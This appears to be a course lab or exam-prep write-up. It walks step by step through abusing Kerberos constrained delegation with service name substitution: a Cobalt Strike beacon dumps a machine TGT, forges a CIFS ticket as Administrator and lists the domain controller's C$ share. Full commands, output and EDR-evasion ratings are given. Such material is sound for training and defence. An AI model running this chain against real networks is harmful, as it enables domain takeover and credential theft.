# Kerberos Challenge — Chapter 16

> **Objective:** Identify and exploit a Kerberos misconfiguration to move laterally to `lon-dc-1` and list the contents of `C$` on the domain controller.

> **Technique:** Constrained delegation with **service name substitution** (`ldap` → `cifs`). `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1` — no CIFS in the delegation list. By substituting the service class in the unencrypted ticket header, the CIFS ticket is accepted by the target because the DC only validates the encrypted PAC, not the SPN prefix.

> **Differs from the training lab** (`Service-Name-Substitution-Kerberos-lab.md`): the lab used `time/lon-fs-1` → `cifs/lon-fs-1` against `lon-fs-1`. This challenge uses `ldap/lon-dc-1` → `cifs/lon-dc-1` against the domain controller itself.

---

## Prerequisites

Load the Kerbeus BOF aggressor script before running any `krb_*` commands:

```
Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

> OPSEC-🟢SAFE — BOF-based Kerberos operations run in beacon thread with no child process spawn.

<img src="/images/kerberos-challenge01.png" width=860>

> Two beacons on LON-WKSTN-1 — `pchilds` (user) and `SYSTEM*` (machine). Kerbeus-BOF script visible in Script Manager. The SYSTEM beacon is required to access LUID `0x3e7`.

---

## Step 1 — Enumerate existing Kerberos tickets

From the beacon running as SYSTEM on `lon-wkstn-1`:

```cs
beacon> krb_triage
```

Key output — machine account logon sessions present:

```
| LUID    | Client               | Service                               | End Time            |
|---------|----------------------|---------------------------------------|---------------------|
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM              | 13.04.2026 06:06:12 |
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com       | 13.04.2026 06:06:12 |
| 0:0x3e7 | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 13.04.2026 06:06:12 |
```

LUID `0x3e7` is the **machine account SYSTEM logon session** — always present on any domain-joined host.

<img src="/images/kerberos-challenge02.png" width=860>

> `krb_triage` output showing LUID `0x3e7` (LON-WKSTN-1$ machine account) tickets. Also visible: first `ldapsearch` run with `userAccountControl` filter finding `LON-DC-1$`.

---

## Step 2 — Enumerate constrained delegation configuration

```cs
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

Output:

```
userAccountControl: 16781312
sAMAccountName: LON-WKSTN-1$
msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
retreived 1 results total
```

> OPSEC-🟢SAFE — BOF ldapsearch, runs in beacon thread, no child process.

**Finding:** `LON-WKSTN-1$` has constrained delegation configured for `ldap/lon-dc-1.contoso.com` — **LDAP only, no CIFS**. This is the misconfiguration. The service class `ldap` can be substituted with `cifs` in the ticket header because the target DC only validates the encrypted portion.

`userAccountControl: 16781312` = `TRUSTED_TO_AUTH_FOR_DELEGATION` flag set (S4U2self enabled without requiring a password).

<img src="/images/kerberos-challenge03.png" width=860>

> `ldapsearch` with `msDS-AllowedToDelegateTo=*` filter — confirms `LON-WKSTN-1$` is delegated to `ldap/lon-dc-1.contoso.com, ldap/lon-dc-1`. No CIFS entry — this is the misconfiguration to exploit.

---

## Step 3 — Dump the machine account TGT

```cs
beacon> krb_dump /luid:3e7 /service:krbtgt
```

Output (truncated):

```
UserName        : LON-WKSTN-1$
Domain          : CONTOSO
LogonId         : 0:0x3e7
UserSID         : S-1-5-18
Authentication  : Negotiate

  [0] Forwarded TGT
    ClientName  : lon-wkstn-1$ @ CONTOSO.COM
    ServiceRealm: krbtgt/CONTOSO.COM @ CONTOSO.COM
    Flags       : forwardable forwarded renewable pre_authent enc_pa_rep
    KeyType     : aes256_cts_hmac_sha1

    doIFrDCCBaigAwIBBaEDAg<snip>AgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
```

OPSEC-🟠CAUTION — BOF, no child process. Uses `LsaCallAuthenticationPackage` Kerberos API — EDR hooks on this API will fire. Does not touch LSASS memory directly.

Copy the full base64 TGT string (ticket index `[0]` — the forwarded, forwardable ticket). Used in the next step.

---

## Step 4 — S4U abuse with service name substitution

Use the machine TGT to perform S4U2proxy for the delegated SPN (`ldap/lon-dc-1`), then substitute the service class to `cifs`:

```cs
beacon> krb_s4u /ticket:doIFrDCCBaigAwIBBaEDAgEWooIEsDCCBKx<snip>C0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator
```

Output:

```
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'

[*] Impersonating user 'Administrator' to target SPN 'ldap/lon-dc-1'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'ldap/lon-dc-1'
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':

doIGhDCCBoCgAwIBBaEDAgEWo<snip>9OVE9TTy5DT02pGzAZoAMCAQKhEjAQGwRjaWZzGwhsb24tZGMtMQ==
```

> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write on target.

<img src="/images/kerberos-challenge05.png" width=860>

> CS beacon showing full `krb_s4u` flow: S4U2self TGS for Administrator → S4U2proxy for `ldap/lon-dc-1` → service name substituted to `cifs` → base64 ticket output. Immediately followed by `make_token CONTOSO\Administrator FakePass` (netonly) and `kerberos_ticket_use` injecting the kirbi.

**What `/altservice:cifs` does:** Replaces the service class in the unencrypted EncTicketPart header. The KDC-signed encrypted PAC is unchanged. The target host validates only the encrypted portion and accepts the substituted ticket.

Copy the full base64 output for SPN `cifs/lon-dc-1`.

---

## Step 5 — Save the service ticket to disk (attacker machine only)

Run this in a **local PowerShell terminal on the attacker desktop** (not via beacon):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("doIGhDCCBoCgAwIBBaEDAgEWooIFnDCC<snip>QGwRjaWZzGwhsb24tZGMtMQ=="))
```

> The `.kirbi` file is written to the attacker desktop only — nothing is written to the target DC. `kerberos_ticket_use` reads the file from the CS client and injects it over the C2 channel.

<img src="/images/kerberos-challenge04.png" width=860>

> PowerShell terminal showing the TGT ticket flags (`forwardable, forwarded, pre_authent, renewable`) confirming the ticket is usable for delegation, and the `WriteAllBytes` command saving the base64 service ticket to `.kirbi` on the attacker desktop.

---

## Step 6 — Inject ticket and access the share

Back in the beacon on `lon-wkstn-1`:

```cs
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
beacon> ls \\lon-dc-1\c$
```

Output:

```
 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     04/11/2025 13:01:00   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/12/2026 21:06:31   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 11:54:00   Windows
 12kb     fil     04/12/2026 14:05:24   DumpStack.log.tmp
 1gb      fil     04/12/2026 14:05:24   pagefile.sys
```

> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in beacon memory. `kerberos_ticket_use` injects the ticket into that session — no disk write on target, no child process.

Drop impersonation when done:

```cs
beacon> rev2self
```

---

## Attack Chain Summary

```
SYSTEM beacon on LON-WKSTN-1
         │
         ▼
krb_triage                        → identify LUID 0x3e7 (machine account session)
         │
         ▼
ldapsearch msDS-AllowedToDelegateTo → LON-WKSTN-1$ → ldap/lon-dc-1 (no CIFS!)
         │
         ▼
krb_dump /luid:3e7 /service:krbtgt → extract machine account TGT (base64)
         │
         ▼
krb_s4u /service:ldap/lon-dc-1     → S4U2proxy for delegated SPN
         /altservice:cifs           → substitute service class in ticket header
         /impersonateuser:Administrator
         │
         ▼
Save base64 → cifs-lon-dc-1.kirbi  (attacker desktop only, no target disk write)
         │
         ▼
make_token CONTOSO\Administrator FakePass  → sacrificial logon session
kerberos_ticket_use cifs-lon-dc-1.kirbi    → inject substituted ticket
         │
         ▼
ls \\lon-dc-1\c$                   → OBJECTIVE COMPLETE
```

---

## OPSEC Summary

| Step | Command | Tier | Notes |
|------|---------|------|-------|
| Enumerate tickets | `krb_triage` | OPSEC-🟢SAFE | BOF, in-thread |
| Find delegation | `ldapsearch` | OPSEC-🟢SAFE | BOF, in-thread |
| Dump TGT | `krb_dump` | OPSEC-🟠CAUTION | LsaCallAuthenticationPackage — EDR hook may fire |
| S4U abuse | `krb_s4u` | OPSEC-🟢SAFE | BOF, in-thread, no disk write |
| Create token | `make_token` | OPSEC-🟢SAFE | In-memory logon session, no network auth |
| Inject ticket | `kerberos_ticket_use` | OPSEC-🟢SAFE | Injected via C2, no target disk write |
| Access share | `ls \\lon-dc-1\c$` | OPSEC-🟠CAUTION | SMB access to DC — logged as logon event on DC |

---

## Dead Ends During Challenge (for reference)

These were exploratory attempts that were not part of the solution:

- `jump winrm64 lon-ws-1 smb` — failed (WinRM not accessible from current host). Not needed — a SYSTEM beacon on LON-WKSTN-1 was already available.
- `Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /ptt` — Rubeus alternative. Not needed because Kerbeus BOF (`krb_s4u`) handled the full S4U chain including the altservice substitution in one command.
- PowerView `Get-DomainComputer | Get-DomainObjectAcl` — checking for RBCD write permissions. Not the attack path here; the delegation was already configured via `msDS-AllowedToDelegateTo`.

---

## Key Takeaway for Exam

When `msDS-AllowedToDelegateTo` contains a non-CIFS SPN (e.g. `ldap/`, `time/`, `http/`), the service name substitution attack still works — request the S4U2proxy ticket for the configured SPN and use `/altservice:cifs` to substitute. The encrypted ticket body is unchanged and accepted by the target. This technique requires no CIFS entry in the delegation list.

---

## Kill Chain Detail

### The Core Idea
`LON-WKSTN-1$` (the machine account) is trusted to delegate to `ldap/lon-dc-1`. You're going to impersonate the Administrator by abusing that trust, then swap `ldap` for `cifs` in the ticket so you can browse the DC's file system.

---

### 1. `krb_triage`
**What it does:** Lists every Kerberos ticket cached on the machine across all logon sessions.

**Why you need it:** You're looking for LUID `0x3e7` — the machine account's SYSTEM logon session. That session holds the machine's own TGT, which is what you'll steal. Every domain-joined Windows machine always has this session running.

---

### 2. `ldapsearch (msDS-AllowedToDelegateTo=*)`
**What it does:** Queries Active Directory for any computer or user account that has constrained delegation configured.

**Why you need it:** You need to know *what* the machine account is allowed to delegate to. The answer here is `ldap/lon-dc-1` — that's the SPN you'll request a ticket for in the next steps. Without this you don't know what service to target.

---

### 3. `krb_dump /luid:3e7 /service:krbtgt`
**What it does:** Extracts the machine account's TGT (Ticket Granting Ticket) from LUID `0x3e7` in LSASS memory as a base64 string.

**Why you need it:** The TGT is the machine's proof of identity to the KDC. You need it to make S4U requests *as the machine account* in the next step. Without the TGT you can't perform the delegation abuse — you'd need the machine account's password hash instead.

---

### 4. `krb_s4u /ticket:[TGT] /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator`
**What it does:** Two things happen inside this one command:

- **S4U2self** — The machine account requests a service ticket *to itself* on behalf of Administrator. This proves to the KDC that Administrator wants to use this machine.
- **S4U2proxy** — Uses that proof to request a service ticket for `ldap/lon-dc-1` impersonating Administrator. This is the delegation step — the KDC allows it because `ldap/lon-dc-1` is in the delegation list.
- **`/altservice:cifs`** — Swaps the word `ldap` for `cifs` in the unencrypted part of the ticket header before it's saved. The DC never checks that part — it only validates the encrypted contents — so the substituted ticket is accepted as a valid `cifs/lon-dc-1` ticket.

**Why you need it:** This is the exploit. The output is a base64 service ticket for `cifs/lon-dc-1` as Administrator, even though CIFS was never in the delegation list.

---

### 5. `[IO.File]::WriteAllBytes("...\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String(...))`
**What it does:** Converts the base64 ticket string from the previous step into a binary `.kirbi` file saved on your attacker desktop.

**Why you need it:** Cobalt Strike's `kerberos_ticket_use` command reads a `.kirbi` file from the attacker machine and injects it into the beacon's logon session. It can't consume raw base64 directly — it needs the file on disk first (attacker disk only, nothing written to the target).

---

### 6. `make_token CONTOSO\Administrator FakePass`
**What it does:** Creates a brand new logon session in memory for `CONTOSO\Administrator` using a completely fake password. The password is never validated against AD — it's a local-only netonly token.

**Why you need it:** You need an empty logon session to inject the Kerberos ticket into. You can't inject a ticket into your current session without overwriting your own credentials. `make_token` creates a clean, isolated session specifically to hold the stolen ticket. The fake password doesn't matter — Kerberos ignores passwords entirely, it only uses tickets.

---

### 7. `kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi`
**What it does:** Takes the `.kirbi` file from your attacker machine and injects the ticket into the logon session created by `make_token`.

**Why you need it:** The ticket now lives inside the `CONTOSO\Administrator` logon session in the beacon. Any network request the beacon makes will automatically present this ticket to authenticate — the beacon now *is* Administrator as far as the DC is concerned.

---

### 8. `ls \\lon-dc-1\c$`
**What it does:** Lists the contents of the C drive on the domain controller over SMB.

**Why you need it:** This is the objective. Windows transparently uses the injected `cifs/lon-dc-1` Kerberos ticket for the SMB authentication — no password prompt, no credential needed. The DC sees a valid Kerberos ticket signed by its own KDC for Administrator and grants access.

---

### One-Line Summary Per Command

| Command | One line |
|---|---|
| `krb_triage` | Find the machine account's logon session (LUID `0x3e7`) |
| `ldapsearch msDS-AllowedToDelegateTo` | Find what SPN the machine is trusted to delegate to |
| `krb_dump /luid:3e7` | Steal the machine account's TGT |
| `krb_s4u /altservice:cifs` | Abuse delegation to forge a CIFS ticket as Administrator |
| `WriteAllBytes` | Save the forged ticket as a `.kirbi` file |
| `make_token ... FakePass` | Create an empty logon session to hold the ticket |
| `kerberos_ticket_use` | Inject the forged ticket into that session |
| `ls \\lon-dc-1\c$` | Use the ticket — prove you own the DC |
